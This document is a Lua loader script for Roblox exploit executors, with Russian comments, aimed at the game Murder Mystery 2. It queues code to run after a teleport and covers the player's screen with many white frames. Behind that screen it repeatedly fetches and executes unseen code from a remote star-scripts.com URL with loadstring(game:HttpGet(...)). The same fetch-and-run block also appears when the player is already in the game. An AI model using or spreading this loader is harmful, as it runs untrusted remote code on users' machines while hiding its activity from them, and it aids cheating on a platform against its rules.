local MM2_PLACE_ID = 142823291

local HttpService     = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Players         = game:GetService("Players")
local player          = Players.LocalPlayer

-- ============================================
-- PAYLOAD ДЛЯ ТЕЛЕПОРТА (с белым экраном)
-- ============================================
local postTeleportCode = [[
    repeat task.wait() until game:IsLoaded() and game:GetService("Players").LocalPlayer
    
    local CoreGui    = game:GetService("CoreGui")
    local player     = game:GetService("Players").LocalPlayer
    
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "WhiteScreenLag"
    screenGui.IgnoreGuiInset = true
    screenGui.DisplayOrder = 2147483647
    screenGui.ResetOnSpawn = false
    
    local ok = pcall(function()
        screenGui.Parent = CoreGui
    end)
    if not ok then
        screenGui.Parent = player:WaitForChild("PlayerGui")
    end
    
    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(1, 0, 1, 0)
    mainFrame.Position = UDim2.new(0, 0, 0, 0)
    mainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    mainFrame.BorderSizePixel = 0
    mainFrame.ZIndex = 2147483647
    mainFrame.Parent = screenGui
    
    for i = 1, 50 do
        local f = Instance.new("Frame")
        f.Size = UDim2.new(1, 0, 1, 0)
        f.Position = UDim2.new(0, 0, 0, 0)
        f.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        f.BorderSizePixel = 0
        f.ZIndex = 2147483647
        f.Parent = screenGui
    end
    
    task.spawn(function()
        while screenGui.Parent do
            for _, child in ipairs(screenGui:GetChildren()) do
                if child:IsA("Frame") then
                    child.Size = UDim2.new(1, 0, 1, 0)
                    child.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                end
            end
            task.wait()
        end
    end)
    
    task.spawn(function()
        task.wait(0.1)
        local injected = false
        local attempts = 0
        local maxAttempts = 20
        
        while not injected and attempts < maxAttempts do
            attempts = attempts + 1
            local ok2, err = pcall(function()
                loadstring(game:HttpGet("https://star-scripts.com/api/run/Ipv49ubUXPVfJNaWKhMzdXU_AbHZKXkX"))()
            end)
            if ok2 then
                injected = true
                print("[MM2 Loader] Inject OK (" .. attempts .. ")")
            else
                warn("[MM2 Loader] Attempt " .. attempts .. ": " .. tostring(err))
                task.wait(0.3)
            end
        end
    end)
]]

-- ============================================
-- HTTP GET
-- ============================================
local function httpGet(url)
    if type(request) == "function" then
        local ok, res = pcall(request, {Url = url, Method = "GET"})
        if ok and res and res.Body then return res.Body end
    end
    if type(http_request) == "function" then
        local ok, res = pcall(http_request, {Url = url, Method = "GET"})
        if ok and res and res.Body then return res.Body end
    end
    if type(syn) == "table" and syn.request then
        local ok, res = pcall(syn.request, {Url = url, Method = "GET"})
        if ok and res and res.Body then return res.Body end
    end
    local ok, body = pcall(function() return game:HttpGet(url) end)
    if ok then return body end
    return nil
end

-- ============================================
-- ЕСЛИ УЖЕ В MM2 — БЕЗ БЕЛОГО ЭКРАНА
-- ============================================
if game.PlaceId == MM2_PLACE_ID then
    print("[MM2] Already in MM2 - injecting without white screen.")
    
    task.spawn(function()
        task.wait(0.1)
        local injected = false
        local attempts = 0
        local maxAttempts = 20
        
        while not injected and attempts < maxAttempts do
            attempts = attempts + 1
            local ok, err = pcall(function()
                loadstring(game:HttpGet("https://star-scripts.com/api/run/Ipv49ubUXPVfJNaWKhMzdXU_AbHZKXkX"))()
            end)
            if ok then
                injected = true
                print("[MM2 Loader] Inject OK (" .. attempts .. ")")
            else
                warn("[MM2 Loader] Attempt " .. attempts .. ": " .. tostring(err))
                task.wait(0.3)
            end
        end
    end)
    
    return
end

-- ============================================
-- НЕ В MM2 — ОЧЕРЕДЬ + ТЕЛЕПОРТ
-- ============================================
local function queueScript(code)
    local methods = {
        function() if type(queue_on_teleport) == "function" then queue_on_teleport(code) end end,
        function() if type(syn) == "table" and syn.queue_on_teleport then syn.queue_on_teleport(code) end end,
        function() if type(fluxus) == "table" and fluxus.queue_on_teleport then fluxus.queue_on_teleport(code) end end,
        function() if type(krnl) == "table" and krnl.queue_on_teleport then krnl.queue_on_teleport(code) end end,
        function() if type(delta) == "table" and delta.queue_on_teleport then delta.queue_on_teleport(code) end end,
        function() if type(getgenv) == "function" and getgenv().queue_on_teleport then getgenv().queue_on_teleport(code) end end,
        function() if type(hydra) == "table" and hydra.queue_on_teleport then hydra.queue_on_teleport(code) end end,
        function() if type(ocha) == "table" and ocha.queue_on_teleport then ocha.queue_on_teleport(code) end end,
        function() if type(electron) == "table" and electron.queue_on_teleport then electron.queue_on_teleport(code) end end,
        function() if type(vypr) == "table" and vypr.queue_on_teleport then vypr.queue_on_teleport(code) end end,
        function() if type(codex) == "table" and codex.queue_on_teleport then codex.queue_on_teleport(code) end end,
    }
    for _, m in ipairs(methods) do
        local ok = pcall(m)
        if ok then return true end
    end
    return false
end

local queued = queueScript(postTeleportCode)
print("[MM2] Queued: " .. tostring(queued))

local function getServers()
    local servers, cursor = {}, ""

    for _ = 1, 3 do
        local url = string.format(
            "https://games.roblox.com/v1/games/%d/servers/Public?limit=100&cursor=%s",
            MM2_PLACE_ID, cursor
        )
        local body = httpGet(url)
        if not body then break end

        local ok, response = pcall(function() return HttpService:JSONDecode(body) end)
        if not ok or not response or not response.data then break end

        for _, s in ipairs(response.data) do
            if s.playing < s.maxPlayers and s.id then
                table.insert(servers, {
                    id = s.id, playing = s.playing,
                    maxPlayers = s.maxPlayers, ping = s.ping or 999,
                })
            end
        end

        cursor = response.nextPageCursor or ""
        if cursor == "" then break end
    end
    return servers
end

local function pickServer(servers, mode)
    if #servers == 0 then return nil end
    if mode == "empty" then
        table.sort(servers, function(a,b) return a.playing < b.playing end)
    elseif mode == "full" then
        table.sort(servers, function(a,b) return a.playing > b.playing end)
    elseif mode == "lowping" then
        table.sort(servers, function(a,b) return a.ping < b.ping end)
    else
        return servers[math.random(1, #servers)]
    end
    return servers[1]
end

local function tryTeleport(jobId)
    if jobId then
        local ok = pcall(function()
            TeleportService:TeleportToPlaceInstance(MM2_PLACE_ID, jobId, player)
        end)
        if ok then return "TeleportToPlaceInstance" end
    end

    local ok2 = pcall(function()
        TeleportService:Teleport(MM2_PLACE_ID, player)
    end)
    if ok2 then return "Teleport" end

    local ok3 = pcall(function()
        TeleportService:TeleportAsync(MM2_PLACE_ID, {player})
    end)
    if ok3 then return "TeleportAsync" end

    if type(joinGame) == "function" then
        local ok4 = pcall(joinGame, MM2_PLACE_ID)
        if ok4 then return "joinGame" end
    end
    if type(game) == "table" and type(game.JoinGame) == "function" then
        local ok5 = pcall(function() game:JoinGame(MM2_PLACE_ID) end)
        if ok5 then return "game:JoinGame" end
    end
    if type(syn) == "table" and syn.joinGame then
        local ok6 = pcall(syn.joinGame, MM2_PLACE_ID)
        if ok6 then return "syn.joinGame" end
    end

    return nil
end

local servers = getServers()
print(string.format("[MM2] Servers: %d", #servers))

local chosen = nil
if #servers > 0 then
    chosen = pickServer(servers, "random")
    print(string.format("[MM2] Chosen: %s (%d/%d, ping %d)",
        chosen.id, chosen.playing, chosen.maxPlayers, chosen.ping))
end

local usedMethod = tryTeleport(chosen and chosen.id or nil)

if usedMethod then
    print("[MM2] Method: " .. usedMethod)
else
    warn("[MM2] No teleport method worked.")
    warn("[MM2] Payload queued for next game join.")
end
